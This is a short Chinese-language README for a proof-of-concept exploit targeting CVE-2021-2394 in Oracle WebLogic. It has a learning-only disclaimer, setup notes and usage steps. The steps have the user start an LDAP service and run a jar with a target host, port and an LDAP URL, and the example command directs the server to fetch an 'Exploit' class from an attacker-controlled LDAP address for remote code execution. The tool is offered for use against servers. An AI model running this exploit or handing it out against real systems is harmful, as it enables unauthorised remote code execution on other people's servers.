# CVE-2021-2394

POC of CVE-2021-2394

- 免责声明
  - 项目仅供学习使用，任何未授权检测造成的直接或者间接的后果及损失，均由使用者本人负责

* 注意事项
  * POC使用IIOP发包，请添加相关依赖（已将12.2.1.3.0版本的依赖放release）
  * 请使用低版本的jdk安装weblogic进行测试

* 使用方法：
  * 启动一个ldap服务
  * `java -jar CVE_2021_2394.jar rhost rport ldapurl`
  * eg:`java -jar CVE_2021_2394.jar 192.168.137.1 7001 ldap://192.168.137.1:8087/Exploit`
* 参考链接：
  * https://mp.weixin.qq.com/s/onoMpyenDkMmsoGEw8VO2A
  * https://github.com/Y4er/CVE-2020-14756
